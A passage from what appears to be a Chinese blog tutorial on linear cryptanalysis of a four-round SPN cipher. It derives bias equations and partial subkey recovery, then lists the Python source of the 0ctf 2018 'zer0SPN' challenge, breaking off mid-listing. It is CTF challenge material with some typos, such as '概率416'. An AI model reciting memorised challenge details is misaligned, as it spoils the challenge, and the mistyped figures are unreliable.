<h3 id="0x03-线性分析法整体分析"><a href="#0x03-线性分析法整体分析" class="headerlink" title="0x03 线性分析法整体分析"></a>0x03 线性分析法整体分析</h3><h4 id="3-1-具体步骤"><a href="#3-1-具体步骤" class="headerlink" title="3.1 具体步骤"></a>3.1 具体步骤</h4><p>根据上面那种线性分析表格，我们有：</p>
<p>$S_{12}: X_1 \oplus X_3 \oplus X_4 = Y_2;  概率12/16, 偏差1/4$</p>
<p>$S_{22}: X_2= Y_2 \oplus Y_4;  概率4/16, 偏差-1/4$</p>
<p>$S_{32}: X_2= Y_2 \oplus Y_4;  概率4/16, 偏差-1/4$</p>
<p>$S_{34}: X_2= Y_2 \oplus Y_4;  概率416, 偏差-1/4$</p>
<p>设 $U_{i,j}(V_{i,j})$ 表示第i轮的16比特中的第j比特输入或输出，$P_i$ 代表16位明文的第i位输入</p>
<p><img src="\images\2018-04-03\5.png" alt=""></p>
<p>于是我们有：</p>
<p>第一轮： $V_{1,6} = U_{1,5} \oplus U_{1,7} \oplus U_{1,8} = (P_5 \oplus K_{1,5}) \oplus (P_7 \oplus K_{1,7}) \oplus (P_8 \oplus K_{1,8})$    (2)</p>
<p>第二轮：$V_{2,6} \oplus V_{2,8} = U_{2,6} = V_{1,6} \oplus K_{2,6}$</p>
<p>带入第一轮的数据，有：$V_{2,6} \oplus V_{2,8} \oplus P_5 \oplus P_7 \oplus P_8 \oplus K_{1,5}  \oplus K_{1,7}  \oplus K_{1,8} \oplus K_{2,6} =0 $  (3)</p>
<p>(2)式的概率偏差是1/4，概率为3/4，带入(3)式有其概率为： 1/2+2(3/4-1/2)(1/4-1/2)=3/8  (偏差-1/8)</p>
<p>第三轮：$V_{3,6} \oplus V_{3,8} = U_{3,6} = V_{2,6} \oplus K_{3,6}$</p>
<p>$V_{3,14} \oplus V_{3,16} = U_{3,14} = V_{2,8} \oplus K_{3,14}$</p>
<p>带入之后有： $V_{3,6} \oplus V_{3,8} \oplus V_{3,14} \oplus V_{3,16} \oplus V_{2,6} \oplus K_{3,6} \oplus V_{2,8} \oplus K_{3,14} = 0$   (4)</p>
<p>(4)式的概率为 1/2+2(1/4-1/2)(1/4-1/2) = 5/8 (偏差为1/8)</p>
<p>结合(3)、(4)式，我们有： $V_{3,6} \oplus V_{3,8} \oplus V_{3,14} \oplus V_{3,16} \oplus P_5 \oplus P_7 \oplus P_8 \oplus K_{1,5}  \oplus K_{1,7}  \oplus K_{1,8}  \oplus K_{2,6} \oplus  K_{3,6} \oplus K_{3,14} = 0$ </p>
<p>第四轮：由$U_{4,6} = V_{3,6} \oplus K_{4,6}$，$U_{4,8} = V_{3,14} \oplus K_{4,8}$， $U_{4,14}=V_{3,8} \oplus K_{4,14}$ ，$U_{4,16} = V_{3,16} \oplus K_{4,16}$</p>
<p>我们有：$U_{4,6} \oplus U_{4,8} \oplus U_{4,14} \oplus U_{4,16} \oplus  P_5 \oplus P_7 \oplus P_8 \oplus \sum_K = 0$ </p>
<p>其中：$\sum_K = K_{1,5}  \oplus K_{1,7}  \oplus K_{1,8} \oplus K_{2,6} \oplus  K_{3,6} \oplus K_{3,14} \oplus K_{4,6}  \oplus K_{4,8}  \oplus K_{4,14} \oplus K_{4,16}$</p>
<p>其中$\sum_K$ 的值为0或1，并且由叠加原理，有其概率为 $1/2+2^3(3/4-1/2)(1/4-1/2)^3=15/32$  （偏差-1/32）</p>
<p>$U_{4,6} \oplus U_{4,8} \oplus U_{4,14} \oplus U_{4,16} \oplus  P_5 \oplus P_7 \oplus P_8 = 0$     （5）</p>
<p>第5轮：</p>
<h4 id="3-2-获取Key的各比特位的值"><a href="#3-2-获取Key的各比特位的值" class="headerlink" title="3.2 获取Key的各比特位的值"></a>3.2 获取Key的各比特位的值</h4><p>上面之所以不进行第5轮的计算，是因为若R-1轮线性分析后，从密文反推会更为容易。</p>
<p>对于给出对应位置的部分目标子密钥$[K_{5,5} ... K_{5,8}, K_{5,13} ... K_{5,16}]$，解密出对应的密文得到$[V_{4,5} ... V_{4,8}, V_{4,13} ... V_{4,16}]$。通过S和的逆变换，我们可以求解出$[U_{4,5} ... U_{4,8}, U_{4,13} ... U_{4,16}]$ 。然后依据（5）式，可以算出符合该线性表达式的次数。</p>
<p>之所以可以使用这种方法，是因为如果部分目标子密钥正确，那么（5）式成立的概率将会与1/2有很大不同。而其他不正确的子密钥，将会造成（5）式概率接近于1/2。</p>
<p>(5)式影响S盒$S_{42}$ 和 $S_{44}$ 的输入。对于每对明密文对，我们将会尝试256种可能的部分目标子密钥$[K_{5,5} ... K_{5,8}, K_{5,13} ... K_{5,16}]$ 。对于每种可能的部分子密钥，我们都会求出(5)式为真时的次数。这些次数偏离最远的就是正确的解，当然不用管这些次数是正向偏移还是逆向偏移（其取决于$\sum_K$）。</p>
<p>当$\sum_K=0$ 时，（5）式成立的概率 &lt; 1/2</p>
<p>当$\sum_K=1$ 时，（5）式成立的概率 &gt; 1/2</p>
<p>我们测试了10000组已知明密文对，用下列公式计算偏移：</p>
<p>$|bias| = |count - 5000|/10000$</p>
<p>最终得到下面的表格：</p>
<p><img src="\images\2018-04-03\6.png" alt=""></p>
<p>根据表格可以看出$[K_{5,5} ... K_{5,8}]=0010, [K_{5,13} ... K_{5,16}]=0100$ 时，偏移概率最大，为0.0336。其实1/32=0.03125。注意到这些之后，我们可以肯定这两部分的密钥值就是这些。</p>
<p>而直到这两部分的值之后，我们完全可以爆破求解另外两部分的密钥（如果密钥是可以反向求解的！）</p>
<h4 id="3-3-攻击的复杂度"><a href="#3-3-攻击的复杂度" class="headerlink" title="3.3 攻击的复杂度"></a>3.3 攻击的复杂度</h4><p>成功原因：如果S盒偏差越大，线性分析的偏差也会越大。</p>
<p>设$\epsilon$ 为线性表达式距离1/2的偏差，Matsui表示要使攻击成功，那么已知明文的数量要与$\epsilon^-2$ 的数量成正比。</p>
<p>如果$N_L$ 表示线性表达式需要的已知明文数量，则有 $N_L \approx 1/\epsilon^2$</p>
<p>由于偏差使用线性叠加的方式来计算的，所以很容易看出偏差依赖于S盒的线性近似表达式和触发的S盒数量。</p>
<h3 id="0x04-范例"><a href="#0x04-范例" class="headerlink" title="0x04 范例"></a>0x04 范例</h3><p>既然讲到了线性分析法，那么我们就必须使用其进行解题。下面是2018 0ctf的一道题，zer0SPN</p>
<p>zer0SPN.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># coding=utf-8</span></div><div class="line"></div><div class="line"><span class="comment">#from secret import secret</span></div><div class="line"></div><div class="line">rcon = [<span class="number">0x8d</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x04</span>, <span class="number">0x08</span>, <span class="number">0x10</span>, <span class="number">0x20</span>, <span class="number">0x40</span>, <span class="number">0x80</span>, <span class="number">0x1b</span>, <span class="number">0x36</span>, <span class="number">0x6c</span>, <span class="number">0xd8</span>, <span class="number">0xab</span>, <span class="number">0x4d</span>, <span class="number">0x9a</span>]</div><div class="line">sbox = [<span class="number">62</span>, <span class="number">117</span>, <span class="number">195</span>, <span class="number">179</span>, <span class="number">20</span>, <span class="number">210</span>, <span class="number">41</span>, <span class="number">66</span>, <span class="number">116</span>, <span class="number">178</span>, <span class="number">152</span>, <span class="number">143</span>, <span class="number">75</span>, <span class="number">105</span>, <span class="number">254</span>, <span class="number">1</span>, <span class="number">158</span>, <span class="number">95</span>, <span class="number">101</span>, <span class="number">175</span>, <span class="number">191</span>, <span class="number">166</span>, <span class="number">36</span>, <span class="number">24</span>, <span class="number">50</span>, <span class="number">39</span>, <span class="number">190</span>, <span class="number">120</span>, <span class="number">52</span>, <span class="number">242</span>, <span class="number">182</span>, <span class="number">185</span>, <span class="number">61</span>, <span class="number">225</span>, <span class="number">140</span>, <span class="number">38</span>, <span class="number">150</span>, <span class="number">80</span>, <span class="number">19</span>, <span class="number">109</span>, <span class="number">246</span>, <span class="number">252</span>, <span class="number">40</span>, <span class="number">13</span>, <span class="number">65</span>, <span class="number">236</span>, <span class="number">124</span>, <span class="number">186</span>, <span class="number">214</span>, <span class="number">86</span>, <span class="number">235</span>, <span class="number">100</span>, <span class="number">97</span>, <span class="number">49</span>, <span class="number">197</span>, <span class="number">154</span>, <span class="number">176</span>, <span class="number">199</span>, <span class="number">253</span>, <span class="number">69</span>, <span class="number">88</span>, <span class="number">112</span>, <span class="number">139</span>, <span class="number">77</span>, <span class="number">184</span>, <span class="number">45</span>, <span class="number">133</span>, <span class="number">104</span>, <span class="number">15</span>, <span class="number">54</span>, <span class="number">177</span>, <span class="number">244</span>, <span class="number">160</span>, <span class="number">169</span>, <span class="number">82</span>, <span class="number">148</span>, <span class="number">73</span>, <span class="number">30</span>, <span class="number">229</span>, <span class="number">35</span>, <span class="number">79</span>, <span class="number">137</span>, <span class="number">157</span>, <span class="number">180</span>, <span class="number">248</span>, <span class="number">163</span>, <span class="number">241</span>, <span class="number">231</span>, <span class="number">81</span>, <span class="number">94</span>, <span class="number">165</span>, <span class="number">9</span>, <span class="number">162</span>, <span class="number">233</span>, <span class="number">18</span>, <span class="number">85</span>, <span class="number">217</span>, <span class="number">84</span>, <span class="number">7</span>, <span class="number">55</span>, <span class="number">63</span>, <span class="number">171</span>, <span class="number">56</span>, <span class="number">118</span>, <span class="number">237</span>, <span class="number">132</span>, <span class="number">136</span>, <span class="number">22</span>, <span class="number">90</span>, <span class="number">221</span>, <span class="number">103</span>, <span class="number">161</span>, <span class="number">205</span>, <span class="number">11</span>, <span class="number">255</span>, <span class="number">14</span>, <span class="number">122</span>, <span class="number">47</span>, <span class="number">71</span>, <span class="number">201</span>, <span class="number">99</span>, <span class="number">220</span>, <span class="number">83</span>, <span class="number">74</span>, <span class="number">173</span>, <span class="number">76</span>, <span class="number">144</span>, <span class="number">16</span>, <span class="number">155</span>, <span class="number">126</span>, <span class="number">60</span>, <span class="number">96</span>, <span class="number">44</span>, <span class="number">234</span>, <span class="number">17</span>, <span class="number">215</span>, <span class="number">107</span>, <span class="number">138</span>, <span class="number">159</span>, <span class="number">183</span>, <span class="number">251</span>, <span class="number">3</span>, <span class="number">198</span>, <span class="number">0</span>, <span class="number">89</span>, <span class="number">170</span>, <span class="number">131</span>, <span class="number">151</span>, <span class="number">219</span>, <span class="number">29</span>, <span class="number">230</span>, <span class="number">32</span>, <span class="number">187</span>, <span class="number">125</span>, <span class="number">134</span>, <span class="number">64</span>, <span class="number">12</span>, <span class="number">202</span>, <span class="number">164</span>, <span class="number">247</span>, <span class="number">25</span>, <span class="number">223</span>, <span class="number">222</span>, <span class="number">119</span>, <span class="number">174</span>, <span class="number">67</span>, <span class="number">147</span>, <span class="number">146</span>, <span class="number">206</span>, <span class="number">51</span>, <span class="number">243</span>, <span class="number">53</span>, <span class="number">121</span>, <span class="number">239</span>, <span class="number">68</span>, <span class="number">130</span>, <span class="number">70</span>, <span class="number">203</span>, <span class="number">211</span>, <span class="number">111</span>, <span class="number">108</span>, <span class="number">113</span>, <span class="number">8</span>, <span class="number">106</span>, <span class="number">57</span>, <span class="number">240</span>, <span class="number">21</span>, <span class="number">93</span>, <span class="number">142</span>, <span class="number">238</span>, <span class="number">167</span>, <span class="number">5</span>, <span class="number">128</span>, <span class="number">72</span>, <span class="number">189</span>, <span class="number">192</span>, <span class="number">193</span>, <span class="number">92</span>, <span class="number">10</span>, <span class="number">204</span>, <span class="number">87</span>, <span class="number">145</span>, <span class="number">188</span>, <span class="number">172</span>, <span class="number">224</span>, <span class="number">226</span>, <span class="number">207</span>, <span class="number">27</span>, <span class="number">218</span>, <span class="number">48</span>, <span class="number">33</span>, <span class="number">28</span>, <span class="number">123</span>, <span class="number">6</span>, <span class="number">37</span>, <span class="number">59</span>, <span class="number">4</span>, <span class="number">102</span>, <span class="number">114</span>, <span class="number">91</span>, <span class="number">23</span>, <span class="number">209</span>, <span class="number">34</span>, <span class="number">42</span>, <span class="number">2</span>, <span class="number">196</span>, <span class="number">141</span>, <span class="number">208</span>, <span class="number">181</span>, <span class="number">245</span>, <span class="number">43</span>, <span class="number">78</span>, <span class="number">213</span>, <span class="number">216</span>, <span class="number">232</span>, <span class="number">46</span>, <span class="number">98</span>, <span class="number">26</span>, <span class="number">212</span>, <span class="number">58</span>, <span class="number">115</span>, <span class="number">194</span>, <span class="number">200</span>, <span class="number">129</span>, <span class="number">227</span>, <span class="number">249</span>, <span class="number">127</span>, <span class="number">149</span>, <span class="number">135</span>, <span class="number">228</span>, <span class="number">31</span>, <span class="number">153</span>, <span class="number">250</span>, <span class="number">156</span>, <span class="number">168</span>, <span class="number">110</span>]</div><div class="line">ptable = [</div><div class="line">    <span class="number">0</span>, <span class="number">8</span>, <span class="number">16</span>, <span class="number">24</span>, <span class="number">32</span>, <span class="number">40</span>, <span class="number">48</span>, <span class="number">56</span>,</div><div class="line">    <span class="number">1</span>, <span class="number">9</span>, <span class="number">17</span>, <span class="number">25</span>, <span class="number">33</span>, <span class="number">41</span>, <span class="number">49</span>, <span class="number">57</span>,</div><div class="line">    <span class="number">2</span>, <span class="number">10</span>, <span class="number">18</span>, <span class="number">26</span>, <span class="number">34</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">58</span>,</div><div class="line">    <span class="number">3</span>, <span class="number">11</span>, <span class="number">19</span>, <span class="number">27</span>, <span class="number">35</span>, <span class="number">43</span>, <span class="number">51</span>, <span class="number">59</span>,</div><div class="line">    <span class="number">4</span>, <span class="number">12</span>, <span class="number">20</span>, <span class="number">28</span>, <span class="number">36</span>, <span class="number">44</span>, <span class="number">52</span>, <span class="number">60</span>,</div><div class="line">    <span class="number">5</span>, <span class="number">13</span>, <span class="number">21</span>, <span class="number">29</span>, <span class="number">37</span>, <span class="number">45</span>, <span class="number">53</span>, <span class="number">61</span>,</div><div class="line">    <span class="number">6</span>, <span class="number">14</span>, <span class="number">22</span>, <span class="number">30</span>, <span class="number">38</span>, <span class="number">46</span>, <span class="number">54</span>, <span class="number">62</span>,</div><div class="line">    <span class="number">7</span>, <span class="number">15</span>, <span class="number">23</span>, <span class="number">31</span>, <span class="number">39</span>, <span class="number">47</span>, <span class="number">55</span>, <span class="number">63</span></div><div class="line">]</div><div class="line">sbox_inv = [<span class="number">143</span>, <span class="number">15</span>, <span class="number">224</span>, <span class="number">141</span>, <span class="number">216</span>, <span class="number">191</span>, <span class="number">213</span>, <span class="number">98</span>, <span class="number">182</span>, <span class="number">91</span>, <span class="number">198</span>, <span class="number">113</span>, <span class="number">156</span>, <span class="number">43</span>, <span class="number">115</span>, <span class="number">68</span>, <span class="number">127</span>, <span class="number">134</span>, <span class="number">94</span>, <span class="number">38</span>, <span class="number">4</span>, <span class="number">186</span>, <span class="number">107</span>, <span class="number">220</span>, <span class="number">23</span>, <span class="number">160</span>, <span class="number">237</span>, <span class="number">207</span>, <span class="number">211</span>, <span class="number">149</span>, <span class="number">77</span>, <span class="number">250</span>, <span class="number">151</span>, <span class="number">210</span>, <span class="number">222</span>, <span class="number">79</span>, <span class="number">22</span>, <span class="number">214</span>, <span class="number">35</span>, <span class="number">25</span>, <span class="number">42</span>, <span class="number">6</span>, <span class="number">223</span>, <span class="number">230</span>, <span class="number">132</span>, <span class="number">65</span>, <span class="number">235</span>, <span class="number">117</span>, <span class="number">209</span>, <span class="number">53</span>, <span class="number">24</span>, <span class="number">169</span>, <span class="number">28</span>, <span class="number">171</span>, <span class="number">69</span>, <span class="number">99</span>, <span class="number">102</span>, <span class="number">184</span>, <span class="number">239</span>, <span class="number">215</span>, <span class="number">130</span>, <span class="number">32</span>, <span class="number">0</span>, <span class="number">100</span>, <span class="number">155</span>, <span class="number">44</span>, <span class="number">7</span>, <span class="number">165</span>, <span class="number">174</span>, <span class="number">59</span>, <span class="number">176</span>, <span class="number">118</span>, <span class="number">193</span>, <span class="number">76</span>, <span class="number">123</span>, <span class="number">12</span>, <span class="number">125</span>, <span class="number">63</span>, <span class="number">231</span>, <span class="number">80</span>, <span class="number">37</span>, <span class="number">88</span>, <span class="number">74</span>, <span class="number">122</span>, <span class="number">97</span>, <span class="number">95</span>, <span class="number">49</span>, <span class="number">200</span>, <span class="number">60</span>, <span class="number">144</span>, <span class="number">108</span>, <span class="number">219</span>, <span class="number">197</span>, <span class="number">187</span>, <span class="number">89</span>, <span class="number">17</span>, <span class="number">131</span>, <span class="number">52</span>, <span class="number">236</span>, <span class="number">120</span>, <span class="number">51</span>, <span class="number">18</span>, <span class="number">217</span>, <span class="number">110</span>, <span class="number">67</span>, <span class="number">13</span>, <span class="number">183</span>, <span class="number">136</span>, <span class="number">180</span>, <span class="number">39</span>, <span class="number">255</span>, <span class="number">179</span>, <span class="number">61</span>, <span class="number">181</span>, <span class="number">218</span>, <span class="number">240</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">103</span>, <span class="number">163</span>, <span class="number">27</span>, <span class="number">172</span>, <span class="number">116</span>, <span class="number">212</span>, <span class="number">46</span>, <span class="number">153</span>, <span class="number">129</span>, <span class="number">246</span>, <span class="number">192</span>, <span class="number">243</span>, <span class="number">175</span>, <span class="number">146</span>, <span class="number">105</span>, <span class="number">66</span>, <span class="number">154</span>, <span class="number">248</span>, <span class="number">106</span>, <span class="number">81</span>, <span class="number">137</span>, <span class="number">62</span>, <span class="number">34</span>, <span class="number">226</span>, <span class="number">188</span>, <span class="number">11</span>, <span class="number">126</span>, <span class="number">201</span>, <span class="number">167</span>, <span class="number">166</span>, <span class="number">75</span>, <span class="number">247</span>, <span class="number">36</span>, <span class="number">147</span>, <span class="number">10</span>, <span class="number">251</span>, <span class="number">55</span>, <span class="number">128</span>, <span class="number">253</span>, <span class="number">82</span>, <span class="number">16</span>, <span class="number">138</span>, <span class="number">72</span>, <span class="number">111</span>, <span class="number">92</span>, <span class="number">85</span>, <span class="number">158</span>, <span class="number">90</span>, <span class="number">21</span>, <span class="number">190</span>, <span class="number">254</span>, <span class="number">73</span>, <span class="number">145</span>, <span class="number">101</span>, <span class="number">203</span>, <span class="number">124</span>, <span class="number">164</span>, <span class="number">19</span>, <span class="number">56</span>, <span class="number">70</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">83</span>, <span class="number">228</span>, <span class="number">30</span>, <span class="number">139</span>, <span class="number">64</span>, <span class="number">31</span>, <span class="number">47</span>, <span class="number">152</span>, <span class="number">202</span>, <span class="number">194</span>, <span class="number">26</span>, <span class="number">20</span>, <span class="number">195</span>, <span class="number">196</span>, <span class="number">241</span>, <span class="number">2</span>, <span class="number">225</span>, <span class="number">54</span>, <span class="number">142</span>, <span class="number">57</span>, <span class="number">242</span>, <span class="number">119</span>, <span class="number">157</span>, <span class="number">177</span>, <span class="number">199</span>, <span class="number">112</span>, <span class="number">168</span>, <span class="number">206</span>, <span class="number">227</span>, <span class="number">221</span>, <span class="number">5</span>, <span class="number">178</span>, <span class="number">238</span>, <span class="number">232</span>, <span class="number">48</span>, <span class="number">135</span>, <span class="number">233</span>, <span class="number">96</span>, <span class="number">208</span>, <span class="number">148</span>, <span class="number">121</span>, <span class="number">109</span>, <span class="number">162</span>, <span class="number">161</span>, <span class="number">204</span>, <span class="number">33</span>, <span class="number">205</span>, <span class="number">244</span>, <span class="number">249</span>, <span class="number">78</span>, <span class="number">150</span>, <span class="number">87</span>, <span class="number">234</span>, <span class="number">93</span>, <span class="number">133</span>, <span class="number">50</span>, <span class="number">45</span>, <span class="number">104</span>, <span class="number">189</span>, <span class="number">173</span>, <span class="number">185</span>, <span class="number">86</span>, <span class="number">29</span>, <span class="number">170</span>, <span class="number">71</span>, <span class="number">229</span>, <span class="number">40</span>, <span class="number">159</span>, <span class="number">84</span>, <span class="number">245</span>, <span class="number">252</span>, <span class="number">140</span>, <span class="number">41</span>, <span class="number">58</span>, <span class="number">14</span>, <span class="number">114</span>]</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">s2b</span><span class="params">(s)</span>:</span></div><div class="line">    <span class="keyword">return</span> map(int, format(int(str(s).encode(<span class="string">'hex'</span>), <span class="number">16</span>), <span class="string">'0&#123;&#125;b'</span>.format(<span class="number">8</span>*len(s))))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">b2s</span><span class="params">(b)</span>:</span></div><div class="line">    <span class="keyword">return</span> bytearray.fromhex(format(reduce(<span class="keyword">lambda</span> x,y: <span class="number">2</span>*x+y, b), <span class="string">'0&#123;&#125;x'</span>.format(len(b)/<span class="number">4</span>)))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">addkey</span><span class="params">(a, b)</span>:</span></div><div class="line">    <span class="keyword">global</span> flag</div><div class="line">    <span class="keyword">return</span> bytearray(i^j <span class="keyword">for</span> i,j <span class="keyword">in</span> zip(a, b))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">substitute</span><span class="params">(a)</span>:</span></div><div class="line">    <span class="keyword">return</span> bytearray(sbox[i] <span class="keyword">for</span> i <span class="keyword">in</span> a)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">permutation</span><span class="params">(a)</span>:</span></div><div class="line">    <span class="keyword">assert</span> len(a) == <span class="number">8</span></div><div class="line">    bits = s2b(a)</div><div class="line">    bits = [bits[ptable[i]] <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">64</span>)]</div><div class="line">    <span class="keyword">return</span> b2s(bits)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">substitute_inv</span><span class="params">(a)</span>:</span></div><div class="line">    <span class="keyword">return</span> bytearray(sbox_inv[i] <span class="keyword">for</span> i <span class="keyword">in</span> a)</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">zer0SPN</span><span class="params">(object)</span>:</span></div><div class="line">    <span class="string">'''0ops Substitution–Permutation Network'''</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, key, key_size=<span class="number">8</span>, rounds=<span class="number">4</span>)</span>:</span></div><div class="line">        <span class="keyword">assert</span> len(key) == key_size</div><div class="line">        self.key = key</div><div class="line">        self.key_size = key_size</div><div class="line">        self.rounds = rounds</div><div class="line">        self.key_schedule()</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">key_schedule</span><span class="params">(self)</span>:</span></div><div class="line">        roundkey = bytearray(self.key)</div><div class="line">        tmp = roundkey[<span class="number">-4</span>:]</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>, self.rounds+<span class="number">1</span>):</div><div class="line">            tmp = tmp[<span class="number">1</span>:] + tmp[:<span class="number">1</span>]</div><div class="line">            tmp = bytearray(sbox[i] <span class="keyword">for</span> i <span class="keyword">in</span> tmp)</div><div class="line">            tmp[<span class="number">0</span>] ^= rcon[i]</div><div class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(self.key_size/<span class="number">4</span>):</div><div class="line">                <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">4</span>):</div><div class="line">                    tmp[k] ^= roundkey[-self.key_size+k]</div><div class="line">                roundkey += tmp</div><div class="line">        self.roundkey = roundkey</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_roundkey</span><span class="params">(self, k)</span>:</span></div><div class="line">        <span class="keyword">assert</span> k &lt;= self.rounds</div><div class="line">        <span class="keyword">return</span> self.roundkey[self.key_size*k:self.key_size*(k+<span class="number">1</span>)]</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(self, plain)</span>:</span></div><div class="line">        <span class="keyword">assert</span> len(plain) == self.key_size</div><div class="line">        block = bytearray(plain)</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(self.rounds):</div><div class="line">            block = addkey(block, self.get_roundkey(i))</div><div class="line">            block = substitute(block)</div><div class="line">            <span class="keyword">if</span> i != self.rounds - <span class="number">1</span>:</div><div class="line">                <span class="comment"># Permutation in the last round is of no purpose.</span></div><div class="line">                block = permutation(block)</div><div class="line">        block = addkey(block, self.get_roundkey(i+<span class="number">1</span>))</div><div class="line">        <span class="keyword">return</span> block</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">key_schedule</span><span class="params">(key)</span>:</span></div><div class="line">    rounds = <span class="number">4</span></div><div class="line">    key_size = <span class="number">8</span></div><div class="line">    roundkey = bytearray(key)</div><div class="line">    tmp = roundkey[<span class="number">-4</span>:]</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>, rounds+<span class="number">1</span>):</div><div class="line">        tmp = tmp[<span class="number">1</span>:] + tmp[:<span class="number">1</span>]</div><div class="line">        tmp = bytearray(sbox[i] <span class="keyword">for</span> i <span class="keyword">in</span> tmp)</div><div class="line">        tmp[<span class="number">0</span>] ^= rcon[i]</div><div class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(key_size/<span class="number">4</span>):</div><div class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">4</span>):</div><div class="line">                tmp[k] ^= roundkey[-key_size+k]</div><div class="line">            roundkey += tmp</div><div class="line">    roundkey = roundkey</div><div class="line">    <span class="keyword">return</span> roundkey</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">key_schedule_inv</span><span class="params">(last_key)</span>:</span></div><div class="line">    rounds = <span class="number">4</span></div><div class="line">    key_size = <span class="number">8</span></div><div class="line">    roundkey = bytearray(last_key)</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(rounds, <span class="number">0</span>, <span class="number">-1</span>):</div><div class="line">        tmp = roundkey[<span class="number">4</span>:<span class="number">8</span>]</div><div class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">4</span>):</div><div class="line">            tmp[k] ^= roundkey[k]</div><div class="line">        roundkey = tmp+roundkey</div><div class="line">        tmp = roundkey[<span class="number">0</span>:<span class="number">4</span>]</div><div class="line">        tmp = tmp[<span class="number">1</span>:] + tmp[:<span class="number">1</span>]</div><div class="line">        tmp = bytearray(sbox[i] <span class="keyword">for</span> i <span class="keyword">in</span> tmp)</div><div class="line">        tmp[<span class="number">0</span>] ^= rcon[i]</div><div class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">4</span>):</div><div class="line">            tmp[k] ^= roundkey[<span class="number">4</span>+k]</div><div class="line">        roundkey = tmp + roundkey</div><div class="line">    roundkey = roundkey</div><div class="line">    <span class="keyword">return</span> roundkey</div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">255</span>):</div><div class="line">    <span class="keyword">print</span> sbox[i]^sbox[i+<span class="number">1</span>]</div><div class="line">exit(<span class="number">0</span>)</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    <span class="keyword">from</span> os <span class="keyword">import</span> urandom</div><div class="line">    <span class="keyword">from</span> struct <span class="keyword">import</span> pack</div><div class="line">    <span class="keyword">import</span> binascii</div><div class="line"></div><div class="line">    <span class="keyword">print</span> <span class="string">"Your flag is flag&#123;%s&#125;"</span> % secret.encode(<span class="string">'hex'</span>)</div><div 